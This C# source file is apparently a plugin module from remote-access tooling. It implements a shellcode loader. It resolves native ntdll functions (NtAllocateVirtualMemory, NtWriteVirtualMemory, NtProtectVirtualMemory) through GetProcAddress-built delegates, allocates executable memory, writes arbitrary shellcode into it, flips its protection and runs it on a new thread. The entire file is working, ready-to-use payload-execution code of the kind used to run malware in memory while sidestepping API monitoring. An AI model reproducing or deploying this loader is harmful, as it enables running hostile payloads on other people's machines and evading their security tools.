using System;
using System.Runtime.InteropServices;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public class ShellCode
    {
        internal static void RunShellCode(byte[] shellCode) 
        {
            new Thread(() => 
            {
                new ShellCode(shellCode).NTDelegates();
            }).Start();
        }

        private byte[] shellCode { get; set; }
        private IntPtr ptr;
        private uint RegionSize;
        public ShellCode(byte[] shellCode)
        {
            this.shellCode = shellCode;
            this.RegionSize = (uint)shellCode.Length;
            this.ptr = IntPtr.Zero;
        }

        internal const String NTDLL = "ntdll.dll";
        internal const String KERNEL32 = "kernel32.dll";

        [DllImport(KERNEL32)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport(KERNEL32)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport(KERNEL32)]
        public static extern IntPtr GetCurrentProcess();

        [Flags]
        internal enum TypeAlloc : uint
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            MEM_LARGE_PAGES = 0x20000000,
            MEM_PHYSICAL = 0x00400000,
            MEM_TOP_DOWN = 0x00100000,
            MEM_WRITE_WATCH = 0x00200000
        }

        [Flags]
        internal enum FreeType : uint
        {
            MEM_DECOMMIT = 0x00004000,
            MEM_RELEASE = 0x00008000,
            MEM_COALESCE_PLACEHOLDERS = 0x00000001,
            MEM_PRESERVE_PLACEHOLDER = 0x00000002
        }

        [Flags]
        internal enum PageProtection : uint
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        internal static class Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            internal delegate void ShellCodeCaller();

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr VirtualAlloc(IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
        }

        private void NTDelegates()
        {
            IntPtr ExportedNtAllocateVirtualMemory = GetProcAddress(GetModuleHandle(NTDLL), "NtAllocateVirtualMemory");
            Delegates.NtAllocateVirtualMemory NtAllocateVirtualMemory = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtAllocateVirtualMemory, typeof(Delegates.NtAllocateVirtualMemory));
            NtAllocateVirtualMemory(GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            IntPtr ExportedNtWriteVirtualMemory = GetProcAddress(GetModuleHandle(NTDLL), "NtWriteVirtualMemory");
            Delegates.NtWriteVirtualMemory NtWriteVirtualMemory = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtWriteVirtualMemory, typeof(Delegates.NtWriteVirtualMemory));
            NtWriteVirtualMemory(GetCurrentProcess(), ptr, this.shellCode, (UIntPtr)this.shellCode.Length, out bytesWritten);

            PageProtection flOld = new PageProtection();
            IntPtr ExportedNtProtectVirtualMemory = GetProcAddress(GetModuleHandle(NTDLL), "NtProtectVirtualMemory");
            Delegates.NtProtectVirtualMemory NtProtectVirtualMemory = (Delegates.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtProtectVirtualMemory, typeof(Delegates.NtProtectVirtualMemory));
            NtProtectVirtualMemory(GetCurrentProcess(), ref ptr, ref RegionSize, PageProtection.PAGE_EXECUTE_READ, ref flOld);

            Delegates.ShellCodeCaller load = (Delegates.ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(Delegates.ShellCodeCaller));
            load();

            IntPtr ExportedNtFreeVirtualMemory = GetProcAddress(GetModuleHandle(NTDLL), "NtFreeVirtualMemory");
            Delegates.NtFreeVirtualMemory NtFreeVirtualMemory = (Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtFreeVirtualMemory, typeof(Delegates.NtFreeVirtualMemory));
            NtFreeVirtualMemory(GetCurrentProcess(), ref ptr, ref RegionSize, FreeType.MEM_RELEASE);
        }
    }
}
